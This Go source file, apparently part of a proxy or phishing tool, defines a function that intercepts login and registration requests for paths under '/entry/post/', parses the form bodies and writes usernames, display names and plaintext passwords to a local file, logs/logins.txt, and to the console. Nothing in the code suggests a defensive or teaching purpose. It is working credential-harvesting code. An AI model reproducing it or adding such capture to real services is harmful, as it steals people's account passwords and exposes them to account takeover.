package logging

import (
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var fileWriteMux sync.Mutex

func LogCredentials(path string, body []byte) {
	if !strings.Contains(path, "/entry/post/login") && !strings.Contains(path, "/entry/post/register") {
		return
	}

	bodyStr := string(body)
	credentials := make(map[string]string)
	pairs := strings.Split(bodyStr, "&")
	for _, pair := range pairs {
		parts := strings.SplitN(pair, "=", 2)
		if len(parts) == 2 {
			key, _ := url.QueryUnescape(parts[0])
			val, _ := url.QueryUnescape(parts[1])
			credentials[key] = val
		}
	}

	login, hasLogin := credentials["login"]
	password, hasPassword := credentials["password"]
	password1, hasPassword1 := credentials["password1"]

	if !hasLogin || (!hasPassword && !hasPassword1) {
		return
	}

	var logLine string
	if strings.Contains(path, "/entry/post/register") {
		displayName := credentials["display_name"]
		logLine = fmt.Sprintf("REGISTER | login=%s | display_name=%s | password1=%s | password2=%s | time=%s\n",
			login, displayName, password1, credentials["password2"], time.Now().Format("2006-01-02 15:04:05"))
	} else {
		logLine = fmt.Sprintf("LOGIN | login=%s | password=%s | time=%s\n",
			login, password, time.Now().Format("2006-01-02 15:04:05"))
	}

	writeToFile(logLine)
	log.Printf("[LOGGED] %s", strings.TrimSpace(logLine))
}

func writeToFile(logLine string) {
	fileWriteMux.Lock()
	defer fileWriteMux.Unlock()

	os.MkdirAll("logs", 0755)
	f, err := os.OpenFile("logs/logins.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Printf("[ERR] Failed to open logs/logins.txt: %v", err)
		return
	}
	defer f.Close()
	f.WriteString(logLine)
}
